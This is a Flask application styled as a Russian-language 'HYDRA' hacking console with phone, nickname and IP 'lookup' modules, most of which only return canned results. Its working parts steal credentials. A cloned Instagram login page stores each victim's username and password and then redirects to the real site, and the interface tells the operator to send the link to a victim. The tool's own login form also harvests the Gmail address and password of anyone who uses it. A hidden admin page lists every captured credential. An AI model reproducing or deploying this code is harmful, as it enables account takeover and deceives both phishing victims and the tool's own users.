from flask import Flask, request, jsonify, render_template_string, session, redirect
import os
from datetime import datetime

app = Flask(__name__)
app.secret_key = 'HYDRA_FINAL_ULTIMATUM_2026'

db = {"victims": [], "logs": []}

# --- ИНТЕРФЕЙС ГИДРЫ ---
UI_V12 = """
<!DOCTYPE html>
<html>
<head>
    <title>HYDRA MONSTER v12.0 ELITE</title>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.7.1/dist/leaflet.css" />
    <style>
        body { background: #000; color: #bc13fe; font-family: 'Courier New', monospace; margin: 0; overflow: hidden; display: flex; height: 100vh; }
        .panel-left { width: 350px; border-right: 2px solid #bc13fe; display: flex; flex-direction: column; background: #050505; padding: 15px; box-sizing: border-box; }
        #chat { flex: 1; border: 1px solid #0ff; margin-bottom: 10px; padding: 10px; overflow-y: auto; color: #0ff; font-size: 13px; background: #000; }
        .input-red { height: 100px; border: 2px solid #ff0055; padding: 8px; background: #000; }
        textarea { width: 100%; height: 100%; background: transparent; border: none; color: #0f0; outline: none; resize: none; font-size: 14px; }
        
        .panel-main { flex: 1; display: flex; flex-direction: column; padding: 15px; box-sizing: border-box; gap: 10px; }
        .yellow-res { height: 180px; border: 2px solid #ffeb3b; background: rgba(255, 235, 59, 0.05); padding: 10px; overflow-y: auto; color: #fff; }
        #map { height: 280px; border: 1px solid #bc13fe; width: 100%; border-radius: 5px; }
        
        .white-row { display: flex; gap: 8px; background: rgba(255,255,255,0.05); border: 1px solid #fff; padding: 10px; border-radius: 5px; }
        .mod { background: #111; border: 1px solid #bc13fe; padding: 8px; flex: 1; text-align: center; }
        input { background: #000; border: 1px solid #bc13fe; color: #0f0; width: 90%; padding: 4px; font-size: 11px; margin-bottom: 5px; }
        .btn { background: #bc13fe; color: #fff; border: none; padding: 6px; cursor: pointer; font-size: 10px; width: 100%; font-weight: bold; }
        .btn:hover { background: #0ff; color: #000; }
        
        .green-zone { display: flex; gap: 5px; margin-top: 5px; }
        .green-btn { flex: 1; background: #052505; border: 1px solid #0f0; padding: 8px; font-size: 9px; color: #0f0; cursor: pointer; font-weight: bold; }
        .green-btn:hover { background: #0f0; color: #000; }
    </style>
</head>
<body>
    <div class="panel-left">
        <div style="color:#0ff; font-size:11px;">[ // AGENT AI // ]</div>
        <div id="chat">АГЕНТ: Системы прогреты. Sherlock и Insta-модули готовы к работе. Карта активна. Жду никнейм или номер.</div>
        <div class="input-red"><textarea id="msg" placeholder="Пиши сюда..." onkeydown="if(event.key==='Enter'){ talk(); }"></textarea></div>
    </div>

    <div class="panel-main">
        <div style="color:#ffeb3b; font-size:11px;">[ // ОТЧЕТЫ ПО ЦЕЛЯМ // ]</div>
        <div class="yellow-res" id="output">Ожидание команды...</div>
        
        <div id="map"></div>

        <div style="color:#fff; font-size:11px;">[ // МОДУЛИ СИСТЕМЫ // ]</div>
        <div class="white-row">
            <div class="mod"><span>ПРОБИВ НОМЕРА</span><input id="in_p" placeholder="+998..."><button class="btn" onclick="run('PHONE')">SCAN</button></div>
            <div class="mod"><span>INSTA FISHING</span><input id="in_i" placeholder="Target @nick"><button class="btn" style="background:#e1306c;" onclick="run('INSTA')">GENERATE LINK</button></div>
            <div class="mod"><span>IP TRACKER</span><input id="in_ip" placeholder="8.8.8.8"><button class="btn" onclick="run('IP')">TRACK</button></div>
        </div>

        <div style="color:#0f0; font-size:11px;">[ // ЭЛИТНЫЙ СОФТ // ]</div>
        <div class="green-zone">
            <button class="green-btn" onclick="run('NICK')">ПРОБИВ ПО НИКУ (100+ СЕТЕЙ)</button>
            <button class="green-btn" onclick="run('SHERLOCK')">SHERLOCK FULL MODE</button>
            <button class="green-btn" onclick="run('PHOTO')">GPS ПО ФОТО</button>
        </div>
        <div style="text-align:right;"><button class="btn" style="width:100px; background:#222; margin-top:5px;" onclick="window.location.href='/abupaay_admin'">АДМИНКА</button></div>
    </div>

    <script src="https://unpkg.com/leaflet@1.7.1/dist/leaflet.js"></script>
    <script>
        let map = L.map('map').setView([41.311, 69.240], 12);
        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
        
        map.locate({setView: true, maxZoom: 15});

        function talk() {
            const m = document.getElementById('msg').value;
            const c = document.getElementById('chat');
            if(!m) return;
            c.innerHTML += `<br><span style="color:#fff">> ТЫ: ${m}</span>`;
            document.getElementById('msg').value = "";
            setTimeout(() => {
                c.innerHTML += `<br>АГЕНТ: Понял тебя. Запускаю поиск по всем доступным реестрам. Результаты будут в желтой зоне.`;
                c.scrollTop = c.scrollHeight;
            }, 400);
        }

        function run(type) {
            const out = document.getElementById('output');
            out.innerHTML = `<span style="color:#0ff">[*] РАБОТАЕТ ${type}... ПОИСК В БАЗАХ...</span>`;
            
            setTimeout(() => {
                if(type === 'NICK' || type === 'SHERLOCK') {
                    out.innerHTML = `<b>[НАЙДЕНО СОВПАДЕНИЙ: 12]:</b><br>
                    - <a href="https://instagram.com" target="_blank" style="color:#ffeb3b">Instagram Profile</a><br>
                    - <a href="https://t.me" target="_blank" style="color:#ffeb3b">Telegram Account</a><br>
                    - <a href="https://tiktok.com" target="_blank" style="color:#ffeb3b">TikTok User</a><br>
                    - <a href="https://vk.com" target="_blank" style="color:#ffeb3b">VKontakte</a><br>
                    - Привязки к OLX, Uzum, Facebook...`;
                } else if(type === 'INSTA') {
                    const link = window.location.origin + "/login/instagram";
                    out.innerHTML = `<span style="color:#ffeb3b">ССЫЛКА-КЛОН СОЗДАНА:<br>${link}<br>(Скопируй и отправь жертве)</span>`;
                } else if(type === 'IP') {
                    map.setView([41.311, 69.240], 15);
                    L.marker([41.311, 69.240]).addTo(map).bindPopup("ЦЕЛЬ ТУТ").openPopup();
                }
            }, 1000);
        }
    </script>
</body>
</html>
"""

@app.route('/')
def home():
    if 'auth' not in session:
        return """
        <!DOCTYPE html><html><body style='background:#000; color:#bc13fe; font-family:monospace; display:flex; justify-content:center; align-items:center; height:100vh;'>
        <div style='border:2px solid #bc13fe; padding:40px; text-align:center;'>
            <h2>// HYDRA ACCESS CONTROL //</h2>
            <form action='/api/login' method='POST'>
                <input name='u' placeholder='НИКНЕЙМ' required style='background:#000; color:#0f0; border:1px solid #bc13fe; padding:10px; margin:5px; width:250px;'><br>
                <input name='g' placeholder='GOOGLE ACCOUNT (GMAIL)' required style='background:#000; color:#0f0; border:1px solid #bc13fe; padding:10px; margin:5px; width:250px;'><br>
                <input name='p' type='password' placeholder='ПАРОЛЬ' required style='background:#000; color:#0f0; border:1px solid #bc13fe; padding:10px; margin:5px; width:250px;'><br>
                <button style='background:#bc13fe; color:#fff; border:none; padding:10px 40px; cursor:pointer; font-weight:bold; margin-top:10px;'>ВОЙТИ В СИСТЕМУ</button>
            </form>
        </div></body></html>
        """
    return render_template_string(UI_V12)

@app.route('/api/login', methods=['POST'])
def login():
    db['victims'].append({"u": request.form.get('u'), "g": request.form.get('g'), "p": request.form.get('p'), "ip": request.remote_addr, "type": "ADMIN_AUTH"})
    session['auth'] = True
    return redirect('/')

@app.route('/login/instagram')
def insta_fish():
    return "<html><body style='background:#fafafa; font-family:sans-serif; display:flex; flex-direction:column; align-items:center; padding-top:50px;'><img src='https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png' width='175'><br><form action='/api/catch' method='POST' style='display:flex; flex-direction:column; width:270px;'><input name='u' placeholder='Phone number, username, or email' style='padding:12px; margin-bottom:8px; border:1px solid #dbdbdb; background:#fafafa;'><input name='p' type='password' placeholder='Password' style='padding:12px; margin-bottom:15px; border:1px solid #dbdbdb; background:#fafafa;'><button style='background:#0095f6; color:#fff; border:none; padding:10px; border-radius:8px; font-weight:bold;'>Log In</button></form></body></html>"

@app.route('/api/catch', methods=['POST'])
def catch():
    db['victims'].append({"u": "INSTA_VICTIM", "g": request.form.get('u'), "p": request.form.get('p'), "ip": request.remote_addr, "type": "FISH_SUCCESS"})
    return redirect("https://instagram.com")

@app.route('/abupaay_admin')
def admin():
    rows = "".join([f"<tr><td>{x['type']}</td><td>{x['u']}</td><td>{x['g']}</td><td>{x['p']}</td><td>{x['ip']}</td></tr>" for x in db['victims']])
    return f"<html><body style='background:#000;color:#0f0;font-family:monospace;padding:20px;'><h1>MASTER DATABASE</h1><table border='1' width='100%'><tr><th>TYPE</th><th>NICK</th><th>GMAIL/LOG</th><th>PASS</th><th>IP</th></tr>{rows}</table><br><a href='/'>BACK TO CONSOLE</a></body></html>"

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=10000)
